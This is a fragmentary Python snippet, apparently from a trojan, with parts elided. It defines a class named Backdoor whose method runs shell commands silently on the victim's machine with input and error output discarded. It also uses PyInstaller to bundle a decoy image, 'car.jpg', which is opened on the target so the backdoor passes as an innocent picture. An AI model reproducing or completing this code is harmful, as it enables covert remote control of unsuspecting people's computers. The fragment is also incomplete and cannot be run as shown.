...
class Backdoor:
    ...
    def execute_system_command(self, command):
        # create a stream to redirect the stdin and stderr to nothing
        DEVNULL = open(os.devnull, 'wb')
        # the code below is for python3
        # return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        # the code below is for python2
...
# pyinstaller default location to store the good file on the target machine
file_name = sys._MEIPASS + "\car.jpg"
# open the good file on target machine
